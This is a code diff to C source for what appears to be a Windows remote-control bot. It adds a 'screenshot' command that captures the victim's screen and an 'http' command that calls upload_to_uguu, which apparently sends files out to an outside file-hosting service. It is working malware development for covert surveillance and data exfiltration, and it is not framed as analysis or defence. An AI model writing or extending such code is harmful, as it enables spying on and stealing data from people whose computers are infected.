@@ -67,6 +67,12 @@ ParsedCommand parsecommand(char* raw_command) {
     else if (strcmp(cmd.params[0], "download") == 0) {
         cmd.type = CMD_FILE_DOWNLOAD;
     }
+    else if (strcmp(cmd.params[0], "screenshot") == 0) {
+        cmd.type = CMD_TAKE_SCREENSHOT;
+    }
+    else if (strcmp(cmd.params[0], "http") == 0) {
+        cmd.type = CMD_HTTP_DOWNLOAD;
+    }
 
 
     return cmd;
@@ -210,14 +216,25 @@ char* execute_parsed_command(ParsedCommand cmd, SOCKET tcpsock) {
         break;
 
     case CMD_GET_APPDATA_PATH: {
-        //wchar_t *path = (wchar_t*)malloc(sizeof(wchar_t) * MAX_PATH);
-        //get_appdata_path(path, MAX_PATH);
-        //output = path;
-        //break;
         output = _strdup("Unicode processing not implemented.");
+        break;
     }
 
+    case CMD_TAKE_SCREENSHOT: {
+        char screenshot_path[MAX_PATH];
+        if (take_screenshot(screenshot_path, MAX_PATH) == 0) {
+            bot_log("Screen shot saved at:%s", screenshot_path);
+            output = _strdup(screenshot_path);
+        }
+        else {
+            output = _strdup("[!] Failed to take screenshot");
+        }
+        break;
+    }
 
+    case CMD_HTTP_DOWNLOAD:
+        output = upload_to_uguu(cmd.params[1]);
+        break;
 
     default:
         output = _strdup("unknown command");
